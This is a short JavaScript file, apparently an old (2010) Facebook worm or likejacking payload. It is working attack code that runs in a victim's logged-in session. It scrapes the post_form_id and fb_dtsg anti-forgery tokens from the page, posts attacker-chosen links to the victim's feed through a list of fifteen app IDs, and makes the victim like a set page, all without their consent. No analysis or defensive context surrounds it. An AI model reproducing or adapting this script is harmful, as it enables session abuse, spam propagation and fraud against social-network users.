// 2010
var appID = ['118307128185700', '164322670266581', '154516381263971', '1660620134071701', '262654147094331', '148444128571141', '158190104219168', '66746580154', '228228293882976', '167124393329943', '153419681387584', '141436685895166', '28586200733', '2347053854', '22410839438'];
var pageID = ['241480312551082'];

sharePage('imgurl', 'urlclick', 'Header1', 'Header2', 'Date');
function sharePage(Picture, Link, Title, Caption, Description) {
	alert(1);
    with(grabInfo = new XMLHttpRequest()) open("GET", "/", false), send(null);
    res = grabInfo.responseText;
    var post_form_id = res.match(/name="post_form_id" value="([\d\w]+)"/)[1];
    var fb_dtsg = res.match(/name="fb_dtsg" value="([^"]+)"/)[1];
    for (var i in appID) {
        post = "post_form_id=" + post_form_id + "&fb_dtsg=" + fb_dtsg + "&app_id=" + appID[i] + "&preview=0&_path=feed&redirect_uri=fbconnect://success&display=touch&picture=" + Picture + "&description=" + Description + "&link=" + Link + "&name=" + Title + "&caption=" + Caption + "&actions=&from_post=1";
        sendCommand(post, "/dialog/feed");
    }
}

function likePage() {
    with(grabInfo = new XMLHttpRequest()) open("GET", "/", false), send(null);
    res = grabInfo.responseText;
    var post_form_id = res.match(/name="post_form_id" value="([\d\w]+)"/)[1];
    var fb_dtsg = res.match(/name="fb_dtsg" value="([^"]+)"/)[1];
    for (var i in pageID) {
        post = "fbpage_id=" + pageID[i] + "&add=1&reload=1&preserve_tab=true&nctr[_mod]=pagelet_header&post_form_id=" + post_form_id + "&fb_dtsg=" + fb_dtsg + "&lsd=post_form_id_source=AsyncRequest";
        sendCommand(post, "/ajax/pages/fan_status.php?__a=1");
    }
}

function sendCommand(sPost, sURL) {
    with(newx = new XMLHttpRequest()) open("POST", sURL), setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), send(sPost);
}

function redirect(sURL) {
    window.open(sURL);
    return false;
}
